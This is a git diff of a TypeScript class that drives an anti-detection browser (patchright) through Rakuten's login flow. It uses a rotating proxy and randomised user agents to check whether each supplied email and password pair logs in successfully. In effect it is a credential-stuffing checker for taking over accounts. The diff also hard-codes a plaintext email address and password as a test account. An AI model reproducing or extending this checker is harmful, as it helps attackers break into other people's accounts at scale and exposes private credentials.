@@ -2,70 +2,123 @@ import { chromium } from "patchright";
 import IVerifyService from "../../application/ports/IVerifyService";
 import { Credential } from "../../core/entities/Credential";
 import UserAgent from "user-agents"
+import { sleep } from "../../utils";
+import { Page } from "patchright";
+import IProxyRepository from "../../core/repositories/IProxyRepository";
 
-const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?response_type=code&client_id=rakuten_racoupon_web&redirect_uri=https%3A%2F%2Fcoupon.rakuten.co.jp/auth/callback&scope=openid%20profile&state=%2FmyCoupon%2F%25E6%25A5%25BD%25E5%25A4%25A9%25E5%25B8%2582%25E5%25A0%25B4%3Fl-id%3Dpc_header_func_coupon&code_challenge=&code_challenge_method=&x=81&y=21&r10_jid_service_id=c23#/sign_in';
+const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?r10_required_claims=r10_name&r10_audience=rae&r10_guest_login=true&r10_jid_service_id=rm001&scope=openid+memberinfo_read_safebulk+memberinfo_read_point+memberinfo_get_card_token+1Hour%40Access+90days%40Refresh&response_type=code&redirect_uri=https%3A%2F%2Fportal.mobile.rakuten.co.jp%2Fauth%2Fcallback&state=redirect_uri%3Dhttps%253A%252F%252Fportal.mobile.rakuten.co.jp%252Fdashboard%26operation%3Dlogin&client_id=rmn_app_web#/sign_in';
+const TEST_ACCOUNT = {
+  email: 'naito5yuki9@gmail.com',
+  password: 'yuki80509'
+}
 
 export default class PlaywrightVerify implements IVerifyService {
+  constructor(private readonly proxyRepository: IProxyRepository) {}
+
   async verify(credential: Credential): Promise<boolean> {
+    if (credential.password.length < 8) {
+      return false;
+    }
+
+    const isDebug = process.env.AUTOMATE_DEBUG === 'true'
+
     const userAgentData = new UserAgent({
       deviceCategory: 'desktop',
       platform: 'Win32'
     })
 
+    const proxy = await this.proxyRepository.rotate();
+
     const browser = await chromium.launch({
       channel: "chrome",
-      headless: false,
-    });
+      headless: isDebug ? false : true,
+      proxy: proxy ? {
+        server: proxy.server,
+        username: proxy.username ?? undefined,
+        password: proxy.password ?? undefined,
+      } : undefined,
+    })
     const context = await browser.newContext({
-      locale: 'en-US',
+      screen: { width: 1920, height: 1080 },
       userAgent: userAgentData.toString(),
-      timezoneId: 'Asia/Tokyo'
-    });
+      // timezoneId: 'Asia/Tokyo'
+    })
     const page = await context.newPage();
+
+    if (isDebug) {
+      await sleep(1000000000)
+    }
 
     try {
       await page.goto(LOGIN_URL);
       await page.waitForLoadState('networkidle');
 
-      await page.getByRole('textbox', { name: 'Username or email' }).fill(credential.email);
-      await page.getByRole('button', { name: 'Next' }).first().click();
+      await page.locator('#user_id').fill(isDebug ? TEST_ACCOUNT.email : credential.email);
+      const nextButton1 = await page.locator('[class*="button__submit"]').first();
+      await nextButton1.waitFor({ state: 'visible', timeout: 5000 });
+      await nextButton1.click();
       await page.waitForLoadState('networkidle');
 
       await page.waitForURL('**/sign_in/password');
-      await page.getByRole('textbox', { name: 'Password' }).fill(credential.password);
-
+      await page.locator('#password_current').fill(isDebug ? TEST_ACCOUNT.password : credential.password);
+      await page.waitForLoadState('networkidle');
       await page.waitForTimeout(1000)
 
-      // Click the Next button - simplified without unnecessary waits
-      const nextButton = page.getByRole('button', { name: 'Next' }).first();
+      const nextButton = await page.locator('[class*="button__submit"]').nth(1);
+
       await nextButton.waitFor({ state: 'visible', timeout: 5000 });
-      await nextButton.click();
 
-      // Race condition: wait for EITHER success OR failure
-      // This dramatically speeds up invalid password detection
-      const result = await Promise.race([
-        // Success path: URL changes to coupon.rakuten.co.jp
-        page.waitForURL('**/coupon.rakuten.co.jp/**', { timeout: 15000 })
-          .then(() => true),
+      const loginResponsePromise = page.waitForResponse(response =>
+        response.url().includes('/v2/login/complete') &&
+        response.request().method() === 'POST'
+      );
 
-        // Fast-fail path 1: Error message appears (invalid credentials)
-        page.waitForSelector('text=Username and/or password are incorrect', { timeout: 5000 })
-          .then(() => false),
+      await nextButton.click()
 
-        // Fast-fail path 2: Page stays on password URL after 3 seconds
-        page.waitForTimeout(3000).then(async () => {
-          const currentUrl = page.url();
-          // If still on password page after 3 seconds, it's likely a failure
-          return currentUrl.includes('/sign_in/password') ? false : true;
-        })
-      ]);
+      // if (isDebug) {
+      //   await sleep(1000000000)
+      // }
 
-      return result;
+      const loginResponse = await loginResponsePromise
+      if (loginResponse.status() !== 200) {
+        return false
+      }
+
+      const isDataUsageBoxVisible = await this.checkDataUsageBox(page);
+      if (!isDataUsageBoxVisible) {
+        return false;
+      }
+
+      const isVerified = await this.checkDataUsageBox(page)
+
+      return isVerified
     } catch (e) {
+      console.error(e)
       return false;
     } finally {
       await context.close();
       await browser.close();
+    }
+  }
+
+  private async checkDataUsageBox(page: Page, retryCount: number = 0): Promise<boolean> {
+    const dataUsageBox = page.locator('rktn-home-data-usage[itemid="d_home_2"]');
+
+    try {
+      console.log(`Checking Data Usage Box (Attempt ${retryCount + 1})...`);
+      await dataUsageBox.waitFor({ state: 'visible', timeout: 15000 });
+      return true;
+    } catch (e) {
+      if (retryCount < 3) {
+        console.log("Element not found, reloading page...");
+
+        if (page.url().includes('dashboard')) {
+            await page.reload({ waitUntil: 'domcontentloaded' });
+            await page.waitForTimeout(3000);
+            return this.checkDataUsageBox(page, retryCount + 1);
+        }
+      }
+      return false;
     }
   }
 }
